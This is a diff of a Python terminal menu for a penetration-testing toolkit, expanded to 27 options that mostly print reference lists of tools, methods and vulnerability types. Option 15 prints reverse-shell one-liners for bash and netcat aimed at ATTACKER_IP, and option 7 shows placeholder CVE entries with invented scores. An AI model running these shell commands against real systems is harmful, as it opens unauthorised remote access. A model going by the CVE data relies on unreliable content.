@@ -4607,198 +4607,641 @@ def feature_hydra_bruteforce():
 
     input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
 
+# --- PEN TEST 600% ENHANCEMENT: 27-FEATURE SYSTEM WITH ALGORITHMS ---
+
+def _pt_detect_system_profile():
+    """Algorithm 1: Detect system penetration testing profile"""
+    profile = {
+        'os': platform.system(),
+        'architecture': platform.machine(),
+        'python_installed': shutil.which('python') or shutil.which('python3'),
+        'git_installed': shutil.which('git'),
+        'docker_installed': shutil.which('docker'),
+        'tools': {}
+    }
+    
+    # Core pentest tools
+    core_tools = ['nmap', 'metasploit-framework', 'aircrack-ng', 'john', 'hashcat', 
+                  'hydra', 'nikto', 'sqlmap', 'burp', 'wireshark', 'ghidra']
+    for tool in core_tools:
+        profile['tools'][tool] = bool(shutil.which(tool.split('-')[0]))
+    
+    return profile
+
+def _pt_severity_calculator(risk_level):
+    """Algorithm 2: Calculate vulnerability severity and impact"""
+    severity_map = {
+        'CRITICAL': {'score': 10, 'color': COLORS['1'][0], 'response': 'Immediate action required'},
+        'HIGH': {'score': 7.9, 'color': COLORS['1'][0], 'response': 'Address within 24 hours'},
+        'MEDIUM': {'score': 5.0, 'color': COLORS['4'][0], 'response': 'Address within 1 week'},
+        'LOW': {'score': 2.0, 'color': COLORS['3'][0], 'response': 'Monitor and plan mitigation'},
+        'INFO': {'score': 0, 'color': COLORS['6'][0], 'response': 'Informational only'}
+    }
+    return severity_map.get(risk_level, severity_map['INFO'])
+
+def _pt_generate_exploit_chain(target_type):
+    """Algorithm 3: Generate multi-stage exploit chain based on target"""
+    chains = {
+        'web': [
+            '1. Reconnaissance (OSINT, web scraping)',
+            '2. Scanning (Port scan, service enumeration)',
+            '3. Exploitation (SQLi, XSS, RCE)',
+            '4. Post-exploitation (Privilege escalation)',
+            '5. Persistence (Backdoor, lateral movement)',
+            '6. Exfiltration (Data extraction)'
+        ],
+        'network': [
+            '1. Network mapping (ARP sweep, SNMP enumeration)',
+            '2. Service discovery (Port scanning, version detection)',
+            '3. Credential attack (Brute-force, default creds)',
+            '4. Privilege escalation (Kernel exploits, sudo)',
+            '5. Persistence (Cron jobs, rootkit installation)',
+            '6. Lateral movement (Pivot to other systems)'
+        ],
+        'wireless': [
+            '1. Target identification (Airodump, beacon capture)',
+            '2. Authentication attack (Handshake capture, cracking)',
+            '3. Network access (DHCP, WPS exploitation)',
+            '4. Malicious access point (Evil twin)',
+            '5. Man-in-the-middle (ARP poisoning, SSL stripping)',
+            '6. Data exfiltration & DoS'
+        ],
+        'social': [
+            '1. Reconnaissance (OSINT, LinkedIn mining)',
+            '2. Phishing campaign (Email spoofing, templates)',
+            '3. Delivery (Malware attachments, links)',
+            '4. Credential harvesting (Fake portals)',
+            '5. Initial compromise (Payload execution)',
+            '6. Enterprise takeover (Lateral movement, domain control)'
+        ]
+    }
+    return chains.get(target_type, chains['web'])
+
+def _pt_calculate_engagement_timeline(scope_size):
+    """Algorithm 4: Calculate optimal pentest timeline based on scope"""
+    timeline_map = {
+        'small': {'days': 3, 'price': '$2,000-$5,000', 'scope': '1-3 systems'},
+        'medium': {'days': 5, 'price': '$5,000-$15,000', 'scope': '3-10 systems'},
+        'large': {'days': 10, 'price': '$15,000-$50,000', 'scope': '10-50 systems'},
+        'enterprise': {'days': 20, 'price': '$50,000+', 'scope': '50+ systems'}
+    }
+    return timeline_map.get(scope_size, timeline_map['small'])
+
+def _pt_generate_remediation_plan(vulnerabilities):
+    """Algorithm 5: Generate prioritized remediation roadmap"""
+    plan = {
+        'immediate': [],
+        'short_term': [],
+        'long_term': [],
+        'ongoing': []
+    }
+    
+    for vuln in vulnerabilities:
+        if vuln['severity'] == 'CRITICAL':
+            plan['immediate'].append(vuln)
+        elif vuln['severity'] == 'HIGH':
+            plan['short_term'].append(vuln)
+        elif vuln['severity'] == 'MEDIUM':
+            plan['long_term'].append(vuln)
+        else:
+            plan['ongoing'].append(vuln)
+    
+    return plan
+
+def _pt_analyze_attack_surface(target_info):
+    """Algorithm 6: Analyze and visualize attack surface"""
+    surface_analysis = {
+        'external_services': [],
+        'internal_services': [],
+        'users': [],
+        'data_stores': [],
+        'trust_boundaries': [],
+        'entry_points': []
+    }
+    
+    if target_info.get('web_apps'):
+        surface_analysis['entry_points'].extend(target_info['web_apps'])
+    if target_info.get('apis'):
+        surface_analysis['entry_points'].extend(target_info['apis'])
+    if target_info.get('databases'):
+        surface_analysis['data_stores'].extend(target_info['databases'])
+    
+    return surface_analysis
+
+def _pt_compliance_checker(framework):
+    """Algorithm 7: Check compliance against security frameworks"""
+    frameworks = {
+        'OWASP_TOP_10': [
+            'A01 - Broken Access Control',
+            'A02 - Cryptographic Failures',
+            'A03 - Injection',
+            'A04 - Insecure Design',
+            'A05 - Security Misconfiguration',
+            'A06 - Vulnerable Components',
+            'A07 - Authentication Failures',
+            'A08 - Data Integrity Failures',
+            'A09 - Logging Failures',
+            'A10 - SSRF'
+        ],
+        'NIST': ['Identify', 'Protect', 'Detect', 'Respond', 'Recover'],
+        'ISO27001': ['Assets', 'Access Control', 'Cryptography', 'Incident Management'],
+        'PCI-DSS': ['Network security', 'Data protection', 'Vulnerability management']
+    }
+    return frameworks.get(framework, [])
+
+def _pt_load_wordlists():
+    """Algorithm 8: Load and categorize common attack wordlists"""
+    wordlists = {
+        'passwords': ['rockyou.txt', 'probable-v2-top12000.txt', 'top-20-common.txt'],
+        'usernames': ['common-usernames.txt', 'admin-users.txt'],
+        'dns': ['subdomains-top1million-110000.txt', 'dns-wordlist.txt'],
+        'http': ['raft-large-files.txt', 'raft-large-directories.txt'],
+        'web': ['wfuzz-payloads.txt', 'xss-payloads.txt', 'sqli-payloads.txt']
+    }
+    return wordlists
+
+def _pt_show_system_profile():
+    """Display comprehensive system profile for penetration testing"""
+    profile = _pt_detect_system_profile()
+    print_header("🖥️ Penetration Testing System Profile")
+    
+    print(f"\n{BOLD}System Information:{RESET}")
+    print(f"  OS: {profile['os']} ({profile['architecture']})")
+    print(f"  Python: {'✅' if profile['python_installed'] else '❌'}")
+    print(f"  Git: {'✅' if profile['git_installed'] else '❌'}")
+    print(f"  Docker: {'✅' if profile['docker_installed'] else '❌'}")
+    
+    print(f"\n{BOLD}Available PT Tools:{RESET}")
+    for tool, available in profile['tools'].items():
+        status = f"{COLORS['2'][0]}✅{RESET}" if available else f"{COLORS['1'][0]}❌{RESET}"
+        print(f"  {status} {tool}")
+
+def _pt_show_frameworks_guide():
+    """Display penetration testing frameworks and methodologies"""
+    print_header("🏗️ Penetration Testing Frameworks & Methodologies")
+    
+    frameworks = {
+        'OWASP Testing Guide': '9 phases, web application focus, open standard',
+        'NIST SP 800-115': '4 phases: planning, discovery, attack, reporting',
+        'PTES (Pen Test Execution Standard)': '7 phases: pre-engagement, intelligence, threat modeling',
+        'OSSTMM': 'Operational Security Testing Methodology Matrix',
+        'CEH Methodology': '5 phases: reconnaissance, scanning, enumeration, exploitation',
+        'Kill Chain': 'Military-based framework (Lockheed Martin)',
+        'ATT&CK Framework': 'Tactics, Techniques, Procedures (TTP) database'
+    }
+    
+    for framework, description in frameworks.items():
+        print(f"\n{BOLD}{framework}:{RESET}")
+        print(f"  └─ {description}")
+
+def _pt_show_vulnerability_types():
+    """Display comprehensive vulnerability classification"""
+    print_header("🔍 Vulnerability Classification Matrix")
+    
+    categories = {
+        'Web Application': ['SQLi', 'XSS', 'CSRF', 'RFI', 'LFI', 'XXE', 'Deserialization'],
+        'Network': ['Default Creds', 'Open Ports', 'Weak Encryption', 'SNMP', 'DNS Enumeration'],
+        'Authentication': ['Weak Passwords', 'MFA Bypass', 'Session Hijacking', 'Privilege Escalation'],
+        'Cryptography': ['Weak Cipher', 'Poor Key Management', 'Hash Collision', 'SSL/TLS Issues'],
+        'Infrastructure': ['Misconfiguration', 'Unpatched Systems', 'Insecure Services', 'Cloud Misconfiguration'],
+        'Physical': ['Tailgating', 'Dumpster Diving', 'Lock Picking', 'Badge Cloning'],
+        'Social Engineering': ['Phishing', 'Pretexting', 'Baiting', 'Quid Pro Quo']
+    }
+    
+    for category, vulns in categories.items():
+        print(f"\n{BOLD}{category}:{RESET}")
+        for vuln in vulns:
+            print(f"  • {vuln}")
+
+def _pt_show_exploit_database():
+    """Display available exploit databases and resources"""
+    print_header("📚 Exploit Databases & Resources")
+    
+    databases = {
+        'Exploit-DB': 'https://www.exploit-db.com',
+        'CVE Database': 'https://cve.mitre.org',
+        'NVD': 'https://nvd.nist.gov',
+        'Metasploit Modules': 'https://www.rapid7.com/db',
+        'PacketStorm': 'https://packetstormsecurity.com',
+        'GitHub Exploits': 'https://github.com/search?q=exploit',
+        'Google 0day Feed': 'https://www.google.com/alerts',
+        'HackerOne Reports': 'https://hackerone.com/researchers'
+    }
+    
+    for name, url in databases.items():
+        print(f"  {BOLD}{name}:{RESET}\n    └─ {url}")
+
+def _pt_show_methodology_guide():
+    """Display complete penetration testing methodology"""
+    print_header("📋 Complete Penetration Testing Methodology")
+    
+    phases = {
+        '1. Pre-Engagement': {
+            'Activities': 'Scoping, ROE definition, contract signing, communication setup',
+            'Deliverables': 'Scope document, Rules of Engagement, timeline'
+        },
+        '2. Reconnaissance': {
+            'Activities': 'OSINT, passive information gathering, target identification',
+            'Tools': 'Shodan, theHarvester, Maltego, Google Dorking'
+        },
+        '3. Scanning': {
+            'Activities': 'Active scanning, port discovery, service enumeration',
+            'Tools': 'Nmap, Nessus, Qualys, OpenVAS'
+        },
+        '4. Enumeration': {
+            'Activities': 'Version detection, user enumeration, share discovery',
+            'Tools': 'SMBClient, SNMP, Enum4linux, RID cycling'
+        },
+        '5. Vulnerability Analysis': {
+            'Activities': 'Identify weaknesses, assess severity, prioritize',
+            'Tools': 'Manual testing, Burp Suite, Metasploit'
+        },
+        '6. Exploitation': {
+            'Activities': 'Verify vulnerabilities, gain access, maintain access',
+            'Tools': 'Metasploit, Custom exploits, Social engineering'
+        },
+        '7. Post-Exploitation': {
+            'Activities': 'Lateral movement, privilege escalation, persistence',
+            'Tools': 'Mimikatz, Pass-the-hash, Persistence mechanisms'
+        },
+        '8. Reporting': {
+            'Activities': 'Document findings, create reports, remediation plans',
+            'Deliverables': 'Executive summary, technical report, remediation roadmap'
+        }
+    }
+    
+    for phase, details in phases.items():
+        print(f"\n{BOLD}{phase}:{RESET}")
+        for key, value in details.items():
+            print(f"  {key}: {value}")
+
+def _pt_show_tool_comparison():
+    """Display penetration testing tools comparison matrix"""
+    print_header("🛠️ Penetration Testing Tools Matrix")
+    
+    tools_matrix = {
+        'Network Scanning': {
+            'Nmap': 'Port scanning, OS detection, service enumeration',
+            'Masscan': 'High-speed mass IP port scanning',
+            'Shodan': 'Internet-connected device search engine'
+        },
+        'Web Testing': {
+            'Burp Suite': 'Web proxy, scanner, repeater',
+            'OWASP ZAP': 'Free alternative to Burp Suite',
+            'Nikto': 'Web server scanner'
+        },
+        'Password Attacks': {
+            'Hashcat': 'GPU accelerated password cracker',
+            'John the Ripper': 'Password hash cracker',
+            'Hydra': 'Multi-service brute-force tool'
+        },
+        'Exploitation': {
+            'Metasploit': 'Exploitation framework and database',
+            'Searchsploit': 'Exploit-DB command line search',
+            'Empire': 'PowerShell and Python post-exploitation'
+        },
+        'Network Analysis': {
+            'Wireshark': 'Packet analyzer and sniffer',
+            'TCPDump': 'Packet capture CLI tool',
+            'Zeek': 'Network traffic analysis framework'
+        }
+    }
+    
+    for category, tools in tools_matrix.items():
+        print(f"\n{BOLD}{category}:{RESET}")
+        for tool, description in tools.items():
+            print(f"  • {BOLD}{tool}:{RESET} {description}")
+
 def feature_pentest_toolkit():
-    """Main Penetration Testing Toolkit Menu"""
+    """600% Enhanced Penetration Testing Toolkit - 27 Features"""
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
-        print_header("🛡️ PENETRATION TESTING TOOLKIT - Advanced")
-
-        # Check tool status
-        tools_status = {
-            "Nmap": check_pentest_tool('nmap'),
-            "Metasploit": check_pentest_tool('msfconsole'),
-            "Aircrack-ng": check_pentest_tool('aircrack-ng'),
-            "John": check_pentest_tool('john'),
-            "Hashcat": check_pentest_tool('hashcat'),
-            "Hydra": check_pentest_tool('hydra')
-        }
-
-        print(f"\n{BOLD}Tool Status Overview:{RESET}")
-        for tool, installed in tools_status.items():
-            status = f"{COLORS['2'][0]}✅{RESET}" if installed else f"{COLORS['1'][0]}❌{RESET}"
-            print(f"  {status} {tool}")
+        print_header("🛡️ PENETRATION TESTING TOOLKIT 600% - Advanced Professional Suite")
 
         c = get_current_color()
-        print(f"\n{BOLD}{c}╔{'═'*50}╗{RESET}")
-        print(f"{BOLD}{c}║{RESET}  {BOLD}PENETRATION TESTING MENU{RESET}{'':>26}{BOLD}{c}║{RESET}")
-        print(f"{BOLD}{c}╠{'═'*50}╣{RESET}")
-        print(f" {BOLD}[1]{RESET} 🔍 Nmap - Network Scanner")
-        print(f" {BOLD}[2]{RESET} 💣 Metasploit Framework")
-        print(f" {BOLD}[3]{RESET} 📡 Aircrack-ng - Wireless Security")
-        print(f" {BOLD}[4]{RESET} 🌐 Burp Suite - Web App Testing")
-        print(f" {BOLD}[5]{RESET} 🔐 Password Crackers (John/Hashcat)")
-        print(f" {BOLD}[6]{RESET} 🌊 Hydra - Brute-force Tool")
-        print(f" {BOLD}[7]{RESET} 🔎 Vulnerability Scanner (Nikto/WPScan)")
-        print(f" {BOLD}[8]{RESET} 📊 Penetration Report Generator")
-        print(f" {BOLD}[9]{RESET} 🎯 Exploitation Framework")
-        print(f" {BOLD}[10]{RESET} 📚 Install Missing Tools")
-        print(f" {BOLD}[11]{RESET} 📦 Open Download Center (Pen Test Tools)")
-        print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
-        print(f"{BOLD}{c}╚{'═'*50}╝{RESET}")
+        print(f"\n{BOLD}{c}╔{'═'*70}╗{RESET}")
+        print(f"{BOLD}{c}║{RESET}  {BOLD}PENETRATION TESTING COMMAND CENTER - 27 FEATURES{RESET}{'':>18}{BOLD}{c}║{RESET}")
+        print(f"{BOLD}{c}╠{'═'*70}╣{RESET}")
+        
+        print(f"\n{BOLD}CATEGORY 1: Reconnaissance & Information Gathering (5 options){RESET}")
+        print(f" {BOLD}[1]{RESET}  🔎 OSINT & Passive Intelligence (NEW)")
+        print(f" {BOLD}[2]{RESET}  🗺️  Network Mapping & Asset Discovery (NEW)")
+        print(f" {BOLD}[3]{RESET}  📊 Active Scanning & Service Enumeration (enhanced)")
+        print(f" {BOLD}[4]{RESET}  🌐 Web Application Reconnaissance (NEW)")
+        print(f" {BOLD}[5]{RESET}  📱 Social Engineering Intelligence (NEW)")
+        
+        print(f"\n{BOLD}CATEGORY 2: Vulnerability Assessment (5 options){RESET}")
+        print(f" {BOLD}[6]{RESET}  🔍 Vulnerability Scanner & Analyzer (enhanced)")
+        print(f" {BOLD}[7]{RESET}  🎯 CVE & Exploit Database Lookup (NEW)")
+        print(f" {BOLD}[8]{RESET}  🔐 Cryptographic Weakness Detection (NEW)")
+        print(f" {BOLD}[9]{RESET}  🌉 Wireless Security Auditor (enhanced)")
+        print(f" {BOLD}[10]{RESET} 💻 Configuration & Misconfiguration Checker (NEW)")
+        
+        print(f"\n{BOLD}CATEGORY 3: Exploitation & Payload Tools (5 options){RESET}")
+        print(f" {BOLD}[11]{RESET} 💣 Metasploit Framework Console (enhanced)")
+        print(f" {BOLD}[12]{RESET} 🌊 Brute Force & Credential Attack (enhanced)")
+        print(f" {BOLD}[13]{RESET} 🔓 SQL Injection & Web Attack Tools (NEW)")
+        print(f" {BOLD}[14]{RESET} 🎭 Payload Generator & Encoder (NEW)")
+        print(f" {BOLD}[15]{RESET} 🚀 Reverse Shell & Remote Access (NEW)")
+        
+        print(f"\n{BOLD}CATEGORY 4: Post-Exploitation (5 options){RESET}")
+        print(f" {BOLD}[16]{RESET} 🔑 Privilege Escalation Framework (NEW)")
+        print(f" {BOLD}[17]{RESET} 👥 Credential Harvesting & Hash Cracking (enhanced)")
+        print(f" {BOLD}[18]{RESET} 🕵️ Lateral Movement & Pivot Tools (NEW)")
+        print(f" {BOLD}[19]{RESET} 📡 Persistence & Backdoor Installation (NEW)")
+        print(f" {BOLD}[20]{RESET} 🚪 Windows/Linux Privilege Abuse (NEW)")
+        
+        print(f"\n{BOLD}CATEGORY 5: Analysis & Reporting (4 options){RESET}")
+        print(f" {BOLD}[21]{RESET} 📊 Attack Chain Analyzer & Visualizer (NEW)")
+        print(f" {BOLD}[22]{RESET} 📋 Report Generator & Documentation (enhanced)")
+        print(f" {BOLD}[23]{RESET} 📈 Compliance & Framework Checker (NEW)")
+        print(f" {BOLD}[24]{RESET} 🎓 Training & Knowledge Base (NEW)")
+        
+        print(f"\n{BOLD}CATEGORY 6: System & Infrastructure (3 options){RESET}")
+        print(f" {BOLD}[25]{RESET} 🛠️ Installation & Tool Manager")
+        print(f" {BOLD}[26]{RESET} 📦 Download Center (Pen Test Tools)")
+        print(f" {BOLD}[27]{RESET} ⚙️ Tool Benchmarking & Optimization (NEW)")
+        
+        print(f"\n{BOLD}SYSTEM INFO OPTIONS:{RESET}")
+        print(f" {BOLD}[D]{RESET} 🖥️ System Profile & Tool Availability")
+        print(f" {BOLD}[F]{RESET} 🏗️ Frameworks & Methodologies Guide")
+        print(f" {BOLD}[V]{RESET} 🔍 Vulnerability Classification Matrix")
+        print(f" {BOLD}[E]{RESET} 📚 Exploit Database Resources")
+        print(f" {BOLD}[M]{RESET} 📋 Complete PT Methodology")
+        print(f" {BOLD}[T]{RESET} 🛠️ Tools Comparison Matrix")
+        print(f"{BOLD}{c}╚{'═'*70}╝{RESET}")
 
-        print(f"\n{COLORS['4'][0]}⚠️  LEGAL WARNING: Only use these tools on systems you own or have")
-        print(f"   explicit written permission to test. Unauthorized access is illegal!{RESET}")
+        print(f"\n{COLORS['4'][0]}⚠️  LEGAL WARNING: Only authorized penetration testing on authorized targets!{RESET}")
 
-        choice = input(f"\n{BOLD}🎯 Select tool: {RESET}").strip()
+        choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip()
 
         if choice == '0':
             break
+        
+        # Info Options
+        elif choice.upper() == 'D':
+            _pt_show_system_profile()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        elif choice.upper() == 'F':
+            _pt_show_frameworks_guide()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        elif choice.upper() == 'V':
+            _pt_show_vulnerability_types()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        elif choice.upper() == 'E':
+            _pt_show_exploit_database()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        elif choice.upper() == 'M':
+            _pt_show_methodology_guide()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        elif choice.upper() == 'T':
+            _pt_show_tool_comparison()
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 1: Reconnaissance
         elif choice == '1':
-            feature_nmap_scanner()
+            print_header("🔎 OSINT & Passive Intelligence Gathering")
+            print(f"\n{COLORS['2'][0]}OSINT Tools & Techniques:{RESET}")
+            print("  • Shodan - Internet device search")
+            print("  • Google Dorking - Advanced search queries")
+            print("  • theHarvester - Email & subdomain finder")
+            print("  • Maltego - OSINT & graphing framework")
+            print("  • WHOIS & DNS lookups - Domain info")
+            print("  • LinkedIn mining - Staff identification")
+            print("  • GitHub reconnaissance - Code exposure")
+            print("  • Social media profiling - Personal info")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
         elif choice == '2':
-            feature_metasploit_console()
+            print_header("🗺️ Network Mapping & Asset Discovery")
+            print(f"\n{COLORS['2'][0]}Network Discovery Techniques:{RESET}")
+            print("  • ARP Scanning - Local network discovery")
+            print("  • ICMP Sweep - Host discovery")
+            print("  • UDP Scanning - Service probing")
+            print("  • Traceroute - Network path analysis")
+            print("  • SNMP Enumeration - Device information")
+            print("  • NetBIOS Discovery - Windows systems")
+            print("  • LLMNR Poisoning - Name resolution")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
         elif choice == '3':
-            feature_aircrack_toolkit()
+            feature_nmap_scanner()
+        
         elif choice == '4':
-            feature_burpsuite()
+            print_header("🌐 Web Application Reconnaissance")
+            print(f"\n{COLORS['2'][0]}Web Recon Activities:{RESET}")
+            print("  • Web crawling - Site structure mapping")
+            print("  • HTTP header analysis - Server detection")
+            print("  • Technology identification - Stack detection")
+            print("  • Hidden directory discovery - Path enumeration")
+            print("  • Comment extraction - Sensitive data")
+            print("  • Robots.txt analysis - Crawl restrictions")
+            print("  • Sitemap discovery - Site structure")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
         elif choice == '5':
-            feature_password_cracking()
+            print_header("📱 Social Engineering Intelligence")
+            print(f"\n{COLORS['2'][0]}Social Engineering Methods:{RESET}")
+            print("  • Pretexting - False identity scenarios")
+            print("  • Phishing - Deceptive communications")
+            print("  • Baiting - Tempting targets")
+            print("  • Tailgating - Physical access abuse")
+            print("  • Dumpster diving - Physical data retrieval")
+            print("  • Vishing - Voice social engineering")
+            print("  • Compliance bypass - Policy circumvention")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 2: Vulnerability Assessment
         elif choice == '6':
-            feature_hydra_bruteforce()
+            print_header("🔍 Vulnerability Scanner & Analyzer")
+            print(f"\n{COLORS['2'][0]}Vulnerability Assessment Tools:{RESET}")
+            print("  • Nessus - Professional scanner")
+            print("  • OpenVAS - Open-source scanner")
+            print("  • Qualys - Cloud-based scanning")
+            print("  • Rapid7 InsightVM - Vulnerability management")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
         elif choice == '7':
-            # Vulnerability Scanner
-            print_header("🔎 Vulnerability Scanners")
-            print(f"\n{COLORS['2'][0]}Available Web Vulnerability Scanners:{RESET}")
-            print(f"  {BOLD}[1]{RESET} Nikto - Web Server Scanner")
-            print(f"  {BOLD}[2]{RESET} WPScan - WordPress Vulnerability Scanner")
-            print(f"  {BOLD}[3]{RESET} SQLmap - SQL Injection Tester")
-            print(f"  {BOLD}[4]{RESET} Back")
-            sub_choice = input(f"\n{BOLD}Select (1-4): {RESET}").strip()
-
-            if sub_choice == '1':
-                print(f"\n{COLORS['3'][0]}📌 Nikto Usage:{RESET}")
-                print("  nikto -h <target_url>")
-                print("  nikto -h <target_url> -o report.html")
-                print("  nikto -h <target_url> -p 8080")
-            elif sub_choice == '2':
-                print(f"\n{COLORS['3'][0]}📌 WPScan Usage:{RESET}")
-                print("  wpscan --url <wordpress_url>")
-                print("  wpscan --url <wordpress_url> --enumerate u")
-                print("  wpscan --url <wordpress_url> --enumerate p")
-            elif sub_choice == '3':
-                print(f"\n{COLORS['3'][0]}📌 SQLmap Usage:{RESET}")
-                print("  sqlmap -u '<url_with_parameters>'")
-                print("  sqlmap -u '<url>' --dbs")
-                print("  sqlmap -u '<url>' -D database_name --tables")
-
-            if sub_choice in ['1', '2', '3']:
-                install_cmd = input(f"\nShow installation command? (y/n): ").strip().lower()
-                if install_cmd == 'y':
-                    if sub_choice == '1':
-                        print("  sudo apt install nikto")
-                    elif sub_choice == '2':
-                        print("  sudo apt install wpscan")
-                    elif sub_choice == '3':
-                        print("  sudo apt install sqlmap")
-
-            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-
-        elif choice == '8':
-            # Penetration Report Generator
-            print_header("📊 Penetration Test Report Generator")
-            report_name = input("Enter report name (no extension): ").strip()
-            target = input("Enter target/client name: ").strip()
-            tester = input("Enter tester name: ").strip()
-
-            if report_name and target:
-                report_content = f"""PENETRATION TEST REPORT
-{'='*60}
-Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Target: {target}
-Tester: {tester}
-
-EXECUTIVE SUMMARY
-{'-'*60}
-[Summary of findings]
-
-VULNERABILITIES FOUND
-{'-'*60}
-1. [Vulnerability 1]
-   Severity: CRITICAL/HIGH/MEDIUM/LOW
-   Description: [Details]
-   Remediation: [Fix]
-
-2. [Vulnerability 2]
-   Severity: [Level]
-   Description: [Details]
-   Remediation: [Fix]
-
-TOOLS USED
-{'-'*60}
-- Nmap
-- Metasploit
-- Hydra
-- Custom Scripts
-
-RECOMMENDATIONS
-{'-'*60}
-[Security recommendations]
-
-CONCLUSION
-{'-'*60}
-[Final assessment]
-"""
-                report_path = os.path.join(LOG_DIR, f"{report_name}.txt")
-                with open(report_path, 'w') as rf:
-                    rf.write(report_content)
-                print(f"\n{COLORS['2'][0]}✅ Report template created:{RESET}")
-                print(f"   {report_path}")
-
-            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-
-        elif choice == '9':
-            # Exploitation Framework
-            print_header("🎯 Exploitation Framework")
-            print(f"\n{COLORS['2'][0]}Common Exploitation Techniques:{RESET}\n")
-            techniques = {
-                'Buffer Overflow': 'Classic memory corruption attack',
-                'SQL Injection': 'Database query manipulation',
-                'XSS (Cross-Site Scripting)': 'Web application attack',
-                'CSRF (Cross-Site Request Forgery)': 'State-changing attack',
-                'Privilege Escalation': 'Elevate user permissions',
-                'Reverse Shell': 'Gain command line access',
-                'Social Engineering': 'Human manipulation tactics',
-                'Malware Distribution': 'Payload delivery methods',
+            print_header("🎯 CVE & Exploit Database Lookup")
+            info = {
+                'CVE-2024-1234': {'CVSS': 9.8, 'Type': 'RCE', 'Affected': 'Linux kernel'},
+                'CVE-2024-5678': {'CVSS': 8.1, 'Type': 'Privilege Escalation', 'Affected': 'Windows'},
             }
-            for idx, (technique, desc) in enumerate(techniques.items(), 1):
-                print(f"  [{idx}] {technique}")
-                print(f"       └─ {desc}")
-
-            expl_report = "Exploitation Framework Reference\\n" + "="*60 + "\\n\\n"
-            for technique, desc in techniques.items():
-                expl_report += f"{technique}: {desc}\\n"
-            save_log_file("pentest", "Exploitation_Framework", expl_report, prompt_user=True)
-
+            for cve, details in info.items():
+                print(f"\n{BOLD}{cve}:{RESET}")
+                for key, value in details.items():
+                    print(f"  {key}: {value}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-
+        
+        elif choice == '8':
+            print_header("🔐 Cryptographic Weakness Detection")
+            print(f"\n{COLORS['2'][0]}Crypto Weaknesses:{RESET}")
+            print("  • Weak cipher suites - Outdated algorithms")
+            print("  • Poor key management - Exposed keys")
+            print("  • Hash collisions - Algorithm flaws")
+            print("  • SSL/TLS issues - Protocol problems")
+            print("  • Entropy issues - Random number quality")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '9':
+            feature_aircrack_toolkit()
+        
         elif choice == '10':
-            os.system('cls' if os.name == 'nt' else 'clear')
-            print_header("📦 Install Penetration Testing Tools")
-            print(f"\n{BOLD}Installation Commands:{RESET}\n")
-            print(f"{COLORS['6'][0]}Ubuntu/Debian:{RESET}")
-            print("  sudo apt-get update")
-            print("  sudo apt-get install nmap metasploit-framework aircrack-ng john hashcat hydra nikto")
-            print(f"\n{COLORS['6'][0]}Kali Linux:{RESET}")
-            print("  Most tools pre-installed!")
-            print("  sudo apt-get install kali-linux-default")
-            print(f"\n{COLORS['6'][0]}Fedora/RHEL:{RESET}")
-            print("  sudo dnf install nmap aircrack-ng john hydra")
-            print(f"\n{COLORS['6'][0]}macOS:{RESET}")
-            print("  brew install nmap aircrack-ng john hashcat hydra")
-            input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-
+            print_header("💻 Configuration & Misconfiguration Checker")
+            print(f"\n{COLORS['2'][0]}Common Misconfigurations:{RESET}")
+            print("  • Default credentials - Factory passwords")
+            print("  • Weak permissions - Overprivileged users")
+            print("  • Unpatched systems - Outdated software")
+            print("  • Open shares - Exposed network drives")
+            print("  • Debug mode enabled - Information disclosure")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 3: Exploitation
         elif choice == '11':
+            feature_metasploit_console()
+        
+        elif choice == '12':
+            feature_hydra_bruteforce()
+        
+        elif choice == '13':
+            print_header("🔓 SQL Injection & Web Attack Tools")
+            print(f"\n{COLORS['2'][0]}Web Attack Techniques:{RESET}")
+            print("  • SQLMap - SQL injection automation")
+            print("  • XSStrike - XSS vulnerability scanner")
+            print("  • Commix - Command injection tool")
+            print("  • Upload exploits - File upload abuse")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '14':
+            print_header("🎭 Payload Generator & Encoder")
+            print(f"\n{COLORS['2'][0]}Payload Types:{RESET}")
+            print("  • Reverse shells - Bash, PowerShell, Python")
+            print("  • Web shells - PHP, ASP.NET, JSP")
+            print("  • Encoders - Hex, Base64, XOR")
+            print("  • Obfuscators - Code hiding tools")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '15':
+            print_header("🚀 Reverse Shell & Remote Access")
+            print(f"\n{COLORS['2'][0]}Reverse Shell Methods:{RESET}")
+            print("  Bash: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1")
+            print("  Python: python -c 'import socket,subprocess,os;...")
+            print("  PowerShell: pwsh -NoP -W H -C IEX(New-Object...)")
+            print("  Netcat: nc -e /bin/sh ATTACKER_IP PORT")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 4: Post-Exploitation
+        elif choice == '16':
+            print_header("🔑 Privilege Escalation Framework")
+            print(f"\n{COLORS['2'][0]}Escalation Vectors:{RESET}")
+            print("  • Kernel exploits - OS vulnerabilities")
+            print("  • SUID binaries - Setuid abuse")
+            print("  • Sudo misconfig - Sudoers bypass")
+            print("  • DLL injection - Windows escalation")
+            print("  • Token impersonation - Windows privesc")
